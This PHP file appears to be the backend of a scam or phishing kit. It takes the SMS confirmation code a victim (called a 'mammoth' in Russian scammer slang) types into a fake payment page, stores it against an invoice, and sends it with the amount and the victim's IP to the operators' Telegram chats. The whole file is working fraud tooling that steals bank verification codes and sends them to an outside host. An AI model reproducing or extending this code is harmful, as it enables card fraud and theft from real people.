<?php

include '../system/main.php';
if ($_SERVER['REQUEST_METHOD'] != 'POST') {
    die();
}
$id = (int)$_POST['id'];
$code = $connection->real_escape_string($_POST['code']);

$query = mysqli_query($connection, "SELECT * FROM `invoices` WHERE `id` = '". $id ."' AND `status` = '2'");
$invoice = mysqli_fetch_assoc($query);

if(!query) {
    printf("Error: %s\n", mysqli_error($connection));
    die();
}

mysqli_query($connection, "UPDATE `invoices` SET status = 1, sms = '". $code ."' WHERE `id` = '". $id ."'");

$query = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `type` = '2' AND `advert_id` = '" . (int)$_SESSION['adid'] . "' AND `status` = '1'");
$order = mysqli_fetch_assoc($query);

$text = "⚠️💳 Мамонт ввёл СМС код. 💳⚠️\n\n";
$text .= "ID объявления: <code>" . $_SESSION['adid'] . "</code>\n";
$text .= "СМС: <code>" . $code . "</code>\n";
$text .= "Сумма: <code>" . $_SESSION['amount'] . "</code>\n";
$text .= "IP: <code>" . $_SERVER['REMOTE_ADDR'] . "</code>";

send('sendMessage', array('chat_id' => $config['admins'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'random_id' => mt_rand()));

$text = "⚠️💳 Мамонт ввёл СМС код. 💳⚠️\n\n";
$text .= "ID объявления: <code>" . $_SESSION['adid'] . "</code>\n";
$text .= "IP: <code>" . $_SERVER['REMOTE_ADDR'] . "</code>";

send('sendMessage', array('chat_id' => $order['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true', 'random_id' => mt_rand()));
